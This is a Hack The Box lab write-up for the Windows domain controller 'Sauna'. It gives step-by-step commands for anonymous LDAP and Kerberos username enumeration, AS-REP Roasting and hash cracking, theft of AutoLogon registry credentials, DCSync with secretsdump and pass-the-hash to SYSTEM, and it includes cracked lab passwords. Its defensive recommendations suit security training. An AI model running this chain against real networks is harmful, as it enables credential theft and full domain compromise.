# Sauna — Hack The Box (CPTS practice)

**Platform:** Hack The Box
**Difficulty:** 🟢 Easy
**OS:** Windows (Active Directory)
**Certification:** Extra practice for the CPTS (Certified Penetration Testing Specialist)
**Date completed:** 2026
**Techniques:** Nmap · Anonymous LDAP enumeration · Web OSINT (team page) · Username wordlist generation · `kerbrute` · **AS-REP Roasting** (`GetNPUsers`) · Hashcat (mode 18200) · Evil-WinRM · AutoLogon registry credentials (WinPEAS) · BloodHound · **DCSync** (`secretsdump`) · Pass-the-hash with `psexec` → SYSTEM
**Language:** English — [🇪🇸 Versión en español](./Sauna_Writeup_ES.md)

---

## Table of contents
1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — anonymous LDAP and web OSINT](#2-enumeration--anonymous-ldap-and-web-osint)
3. [Initial access — AS-REP Roasting](#3-initial-access--as-rep-roasting)
4. [Getting a shell](#4-getting-a-shell)
   - [Privilege escalation — AutoLogon and DCSync](#privilege-escalation--autologon-and-dcsync)
5. [Post-exploitation and flags](#5-post-exploitation-and-flags)
6. [Lessons learned](#6-lessons-learned)
7. [Tool & command glossary](#7-tool--command-glossary)

---

## 1. Reconnaissance

```bash
ping -c 1 10.129.95.180
```

> 🛠️ **`ping`** — checks host availability via ICMP. A TTL of **127** → **Windows**.

![](Imagenes/01-ping.png)

Full TCP port scan:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- -oN AllPorts 10.129.95.180
```

> 🛠️ **`nmap -sS -Pn -vvv --min-rate 5000 --open -n -p-`** — a full SYN scan of all 65535 ports: `-sS` (stealthy), `-Pn` (ignore ping status), `--min-rate 5000` (speeds up sending), `--open` (only open ports), `-n` (no DNS resolution).

![](Imagenes/02-nmap-allports.png)

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — a custom script that summarizes Nmap's output: IP, TTL, estimated OS, and a port list ready for the next `-p`.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

> 💡 20 open ports, including **53 (DNS), 88 (Kerberos), 389/636/3268/3269 (LDAP/LDAPS/Global Catalog), 445 (SMB), and 5985 (WinRM)** — the classic service set of an **Active Directory domain controller**, plus port 80 hosting a corporate website.

Version and default-script scan:

```bash
nmap -sS -Pn -sCV -T5 -n -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49679,49700,49719 -oN Ports 10.129.95.180
```

> 🛠️ **`-sCV`** combines `-sC` (Nmap's default scripts) with `-sV` (service version detection).

![](Imagenes/04-nmap-version-servicios-dc.png)

```
80/tcp  open  http  Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
389/tcp open  ldap  Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, ...)
Service Info: Host: SAUNA; OS: Windows
```

> 💡 Domain **`EGOTISTICAL-BANK.LOCAL`**, host **`SAUNA`**. Unlike other typical AD boxes, **no initial credentials are provided here** — we need to obtain a first valid account from scratch.

## 2. Enumeration — anonymous LDAP and web OSINT

### Credential-less LDAP enumeration

```bash
ldapsearch -x -H ldap://10.129.95.180 -s base namingcontexts
```

> 🛠️ **`ldapsearch -x`** — a command-line LDAP client; `-x` forces simple authentication (here, anonymous, no username/password). `-s base namingcontexts` asks only for the server's *naming contexts* — the first step to learn what directory partitions exist, with no need to authenticate.

![](Imagenes/05-ldapsearch-namingcontexts-anonimo.png)

```bash
ldapsearch -x -H ldap://10.129.95.180 -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
```

> 🛠️ **`-b "DC=..."`** — sets the search's *base DN* to the full domain, returning (if the anonymous bind has read permissions, as is the case here) the entire visible object tree: users, groups, computers, etc.

![](Imagenes/06-ldapsearch-base-domain-info.png)

> 💡 Many domain controllers inherit, through default configuration or a hardening gap, anonymous read permissions over certain LDAP attributes. It's the quietest possible AD recon path: it triggers no failed-authentication or Kerberos event.

A user shows up among the results:

![](Imagenes/07-ldapsearch-usuario-hugo-smith.png)

```
CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

### Building a username wordlist

With one full name, we generate a wordlist of the most common Active Directory username formats:

![](Imagenes/08-diccionario-usuarios-formato-ad.png)

```
hugosmith
hsmith
h.smith
shugo
smith
hugo.smith
```

> 💡 Organizations usually follow one fixed username convention (first-initial+lastname, firstname.lastname, etc.). Finding **just one** real full name is enough to infer the format and generate plausible usernames for the rest of the staff — the basis of any AD username-enumeration attack.

We validate the candidates against Kerberos:

```bash
kerbrute userenum --dc 10.129.95.180 --domain EGOTISTICAL-BANK.LOCAL users.txt
```

> 🛠️ **`kerbrute userenum`** — abuses a Kerberos protocol quirk: the KDC responds **differently** to an authentication request (`AS-REQ`) depending on whether the username exists or not (`KDC_ERR_C_PRINCIPAL_UNKNOWN` if it doesn't), **with no need for a correct password**. This enumerates valid usernames quickly and, unlike real login attempts, triggers no "wrong password" events under most configurations.

![](Imagenes/09-kerbrute-userenum-hsmith-valido.png)

```
[+] VALID USERNAME: hsmith@EGOTISTICAL-BANK.LOCAL
```

### Expanding the enumeration from the website

We browse the corporate website on port 80:

![](Imagenes/10-web-egotistical-bank-home.png)

The `about.html` page shows off the full team with first and last names:

![](Imagenes/11-web-about-equipo-nombres.png)

```
Fergus Smith, Shaun Coins, Hugo Bear, Bowie Taylor, Sophie Driver, Steven Kerb
```

> 💡 This is a textbook case of **passive OSINT handed over by the organization itself**: the "About Us" page, meant for marketing/HR purposes, directly reveals the entire staff roster — information that, combined with the already-confirmed username format, lets us build a wordlist of real accounts without touching any internal system.

With the format already confirmed (first initial + last name), we build the full wordlist:

![](Imagenes/12-diccionario-usuarios-equipo-completo.png)

```
hsmith
fsmith
hbear
skerb
btylor
scoins
sdriver
```

```bash
kerbrute userenum --dc 10.129.95.180 --domain EGOTISTICAL-BANK.LOCAL users.txt
```

![](Imagenes/13-kerbrute-userenum-hsmith-fsmith-validos.png)

```
[+] VALID USERNAME: hsmith@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
```

## 3. Initial access — AS-REP Roasting

### What is AS-REP Roasting, and why does it work?

In a normal Kerberos login, the client has to **prove it knows the password** by encrypting a timestamp with its password-derived key, as part of the initial `AS-REQ` (this is called **pre-authentication**, controlled by the `DONT_REQUIRE_PREAUTH` flag on the `userAccountControl` attribute). If an account has that pre-authentication **disabled**, the KDC responds directly with an `AS-REP` that includes a portion encrypted with the user's password-derived key — **with no need for the attacker to know or guess any password first**.

That encrypted portion is crackable offline exactly like a password hash: if an attacker recovers a cleartext password that, when derived, produces that key, the attack succeeds. This is called **AS-REP Roasting**, and it only requires knowing the name of a user with pre-authentication disabled — no prior credentials needed.

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
```

> 🛠️ **`GetNPUsers.py`** (Impacket) — for each user in the given list, it requests an `AS-REQ` with no pre-authentication and checks the KDC's response: if the user has `DONT_REQUIRE_PREAUTH` set, it extracts the AS-REP hash (`$krb5asrep$23$...`); otherwise, it reports the corresponding error without compromising anything. `-no-pass` means we have no password at all.

![](Imagenes/14-getnpusers-asrep-hash-fsmith.png)

```
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:671f53f5ab673ece...
```

`hsmith` has pre-authentication enabled (protected), but `fsmith` doesn't — we obtain their AS-REP hash.

### Cracking the AS-REP hash

```bash
hashcat --example-hashes | grep krb5asrep -B 15
```

> 🛠️ **`hashcat --example-hashes`** — lists every supported hash format with an example; filtering for `krb5asrep` identifies the exact numeric mode (**18200**, "Kerberos 5, etype 23, AS-REP") with no need to check external documentation.

![](Imagenes/15-hashcat-ejemplo-hash-18200-asrep.png)

```bash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

> 🛠️ **`hashcat -m 18200 -a 0`** — a dictionary attack (`-a 0`) against an AS-REP hash (mode `18200`) using `rockyou.txt`.

![](Imagenes/16-hashcat-m18200-rockyou.png)
![](Imagenes/17-hashcat-hash-crackeado-fsmith-thestrokes23.png)

```
fsmith:Thestrokes23
```

## 4. Getting a shell

```bash
evil-winrm -u 'fsmith' -p 'Thestrokes23' -i 10.129.95.180
```

> 🛠️ **`evil-winrm`** — a client for Windows Remote Management (WinRM) sessions, spiritually equivalent to SSH but for remote PowerShell.

![](Imagenes/18-evil-winrm-login-fsmith.png)

Shell obtained. First flag:

```
dir ../Desktop
```

![](Imagenes/19-dir-desktop-user-txt.png)

`user.txt` (34 bytes) confirmed on `FSmith`'s desktop.

```
whoami /all
```

> 🛠️ **`whoami /all`** — combines user, group, and privilege information in one output; useful for quickly ruling out interesting privileges on the current token.

![](Imagenes/20-whoami-all-fsmith.png)

We check which other accounts have remote access to the machine:

```
net localgroup "Remote Management Users"
```

> 🛠️ **`net localgroup "Remote Management Users"`** — lists the members of the local group that enables WinRM access; useful for discovering other service accounts to pivot into.

![](Imagenes/21-net-localgroup-remote-management-users.png)

```
FSmith
svc_loanmgr
```

## Privilege escalation — AutoLogon and DCSync

We upload **WinPEAS** to automate the search for escalation vectors:

```bash
locate winPEASx64.exe
```

![](Imagenes/22-winpeas-listado-binarios.png)

```
upload /usr/share/peass/winpeas/winPEASx64.exe
```

> 🛠️ **`upload`** — an Evil-WinRM built-in command that transfers a local file to the victim over the already-authenticated WinRM session.

![](Imagenes/23-evil-winrm-upload-winpeasx64.png)

```
./winPEASx64.exe
```

> 🛠️ **WinPEAS** — an automated Windows privilege-escalation enumeration script: registry credentials, misconfigured services, scheduled tasks, AutoLogon, and more.

![](Imagenes/24-winpeas-ejecucion-banner.png)

### What are AutoLogon credentials?

Among the findings, WinPEAS spots **AutoLogon** credentials:

![](Imagenes/25-winpeas-autologon-credenciales-svc-loanmgr.png)

```
DefaultDomainName : EGOTISTICALBANK
DefaultUserName   : EGOTISTICALBANK\svc_loanmanager
DefaultPassword   : Moneymakestheworldgoround!
```

> 💡 Windows' **AutoLogon** feature (meant to log in automatically at boot, with no password prompt) stores those credentials **in cleartext** in the registry, under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` (`DefaultUserName`/`DefaultPassword`). Any user with read access to that registry key can pull the password directly — it's one of the first things any Windows post-exploitation enumeration script checks.

With those credentials (the `svc_loanmgr` account, also in `Remote Management Users`):

```bash
evil-winrm -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -i 10.129.95.180
```

![](Imagenes/26-evil-winrm-login-svc-loanmgr.png)

### Enumerating the domain with BloodHound

```bash
bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip
```

> 🛠️ **`bloodhound-python`** — the Linux BloodHound collector: walks the domain over LDAP/SMB/RPC with the given credentials and dumps every user, group, ACL, session, and trust relationship into JSON files, zipped via `--zip`.

![](Imagenes/27-bloodhound-python-collection.png)

```bash
bloodhound-start
```

> 🛠️ **BloodHound (GUI)** — analyzes the domain's relationship graph to find attack paths that aren't obvious at a glance (chained ACL permissions, nested group membership, etc.). It needs a Neo4j database, which `bloodhound-start` launches automatically.

![](Imagenes/28-bloodhound-start-neo4j.png)

We upload the ZIP produced by the collector:

![](Imagenes/29-bloodhound-upload-files.png)

### What is a DCSync attack, and why does it work?

Looking up the `svc_loanmgr` node, the graph reveals it holds **`GetChangesAll`** and **`GetChanges`** rights over the domain object itself:

![](Imagenes/30-bloodhound-svc-loanmgr-getchangesall.png)
![](Imagenes/31-bloodhound-grafico-dcsync-rights.png)

> 💡 **`GetChanges`** and **`GetChangesAll`** are the two Active Directory extended rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) a domain controller needs to grant another one in order to **replicate** the directory between them — the legitimate mechanism behind AD's multi-master replication. When a regular account (not a DC) holds both rights over the domain, it can use the replication protocol (**MS-DRSR**) to ask the real domain controller to "replicate" the credentials of **any account**, Administrator included — exactly as if it were another DC. This is the **DCSync** attack: it requires no code execution on the DC and no software vulnerability, just abuse of a misassigned delegation permission.

We exploit those permissions with `secretsdump`:

```bash
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.129.95.180
```

> 🛠️ **`secretsdump.py`** (Impacket) — given domain credentials and the right replication permissions, it implements the DRSUAPI/MS-DRSR protocol to request a full `NTDS.dit` dump from the DC (every NT hash and Kerberos key in the domain) with no disk access or code execution needed on the controller.

![](Imagenes/32-secretsdump-dcsync-ntds-hashes.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

> 🔒 Administrator's real NT hash isn't published in this writeup on purpose, so anyone practicing this same box still has to complete that step themselves — the exact command to obtain it is documented above.

With Administrator's hash, pass-the-hash via `psexec`:

```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 cmd.exe -hashes :<Administrator NT hash>
```

> 🛠️ **`psexec.py`** (Impacket) — a reimplementation of Sysinternals' PsExec: uploads a temporary service binary to an administrative share (`ADMIN$`), registers it as a service via `SVCManager`, and starts it, yielding a remote shell with the privileges of the authenticating account — Administrator, here, via pass-the-hash.

![](Imagenes/33-psexec-pth-administrator-shell.png)

```
whoami /all
```

![](Imagenes/34-whoami-system.png)

```
nt authority\system
```

> 💡 `psexec` runs the service with **`NT AUTHORITY\SYSTEM`** privileges, not just Administrator — Windows' maximum privilege level.

## 5. Post-exploitation and flags

```
dir C:\Users\Administrator\Desktop
```

![](Imagenes/35-dir-desktop-administrator-root-txt.png)

`root.txt` (34 bytes) confirmed on Administrator's desktop — full domain controller compromise.

> 🔒 The exact contents of `user.txt` and `root.txt` aren't published in this writeup on purpose, so anyone practicing this same box still has to complete that last step themselves — the full path to each one is documented in §4 and §5.

## 6. Lessons learned

| Vulnerability | Where | Impact |
|----------------|-------|---------|
| Anonymous LDAP enumeration enabled on the DC | Port 389 | Leaks usernames with zero credentials |
| Corporate website with employees' full names | `about.html` | Lets an attacker infer the entire staff's username format (passive OSINT) |
| Domain account with Kerberos pre-authentication disabled | `fsmith` | **AS-REP Roasting**: a crackable hash with no interaction with the account |
| Weak password, present in `rockyou.txt` | `fsmith` account | Authenticated domain access after cracking the hash |
| AutoLogon credentials stored in cleartext in the registry | `svc_loanmgr` | Trivial credential theft with registry read access |
| Replication rights (`GetChangesAll`/`GetChanges`) over the domain assigned to a service account | `svc_loanmgr` | **DCSync** attack: dumping every hash in the domain, Administrator included |

## Defensive recommendations

- Disable anonymous LDAP enumeration on the domain controller.
- Don't publish employees' full names on public web pages that could reveal the corporate username format.
- Enable Kerberos pre-authentication on every domain account (periodically audit the `DONT_REQUIRE_PREAUTH` flag).
- Enforce strong passwords and rotation policies on all accounts, service accounts included.
- Never use AutoLogon with domain credentials stored in the registry; if automated login is required, use Credential Guard or a dedicated credential vault.
- Strictly audit and restrict which accounts hold replication rights (`Replicating Directory Changes` / `Replicating Directory Changes All`) over the domain — only legitimate domain controllers and strictly necessary backup accounts.
- Monitor unusual DRS replication requests (from outside the actual DCs) as an indicator of a possible DCSync attack.

## 7. Tool & command glossary

| Tool / command | What it's for |
|------------------|-----------------|
| `ping` / `nmap` | Host discovery and port/service enumeration |
| `enum-nmap` | Custom script that summarizes Nmap's output |
| `ldapsearch -x` | A command-line LDAP client; `-x` allows a simple bind, including an anonymous one if the server permits it |
| **Anonymous LDAP enumeration** | An AD recon technique that needs no credentials and triggers no failed-authentication event |
| **Web OSINT ("About Us" page)** | Corporate pages meant for marketing/HR often unknowingly leak the entire employee roster |
| `kerbrute userenum` | Enumerates valid Kerberos usernames by abusing the KDC's differentiated response to an `AS-REQ`, with no correct password needed |
| **AS-REP Roasting** (`GetNPUsers.py`) | Obtains a crackable hash from any account with Kerberos pre-authentication disabled, without knowing its password |
| `hashcat -m 18200` | A dictionary attack against AS-REP hashes (Kerberos 5, etype 23) |
| `evil-winrm` | A client for Windows Remote Management (WinRM) sessions |
| `net localgroup "Remote Management Users"` | Lists the accounts with WinRM connection permission on the machine |
| **WinPEAS** | Automated Windows privilege-escalation enumeration, including AutoLogon credentials |
| **AutoLogon credentials** | Windows stores them in cleartext in the registry (`Winlogon`) to log in without a password prompt; readable by anyone with registry access |
| `bloodhound-python` | The Linux BloodHound collector; dumps the domain's users, groups, ACLs, and sessions into JSON |
| **BloodHound** | Graphically analyzes AD relationships to find non-obvious escalation paths (ACL abuse, delegation, nested groups) |
| **DCSync** (`GetChanges`/`GetChangesAll`) | Abusing AD replication permissions to ask the DC for any account's credentials, with no code execution on the controller |
| `secretsdump.py` | Implements the DRSUAPI/MS-DRSR replication protocol to remotely dump `NTDS.dit` (every hash in the domain) |
| **Pass-the-hash (PtH)** | Authenticating with the NT hash directly, with no need for the cleartext password |
| `psexec.py` | A PsExec reimplementation; uploads and runs a temporary service on the victim, yielding a shell with the authenticating account's privileges |

---

*Written by [Arabot](https://github.com/Caan31) · Hack The Box · CPTS practice · 2026*
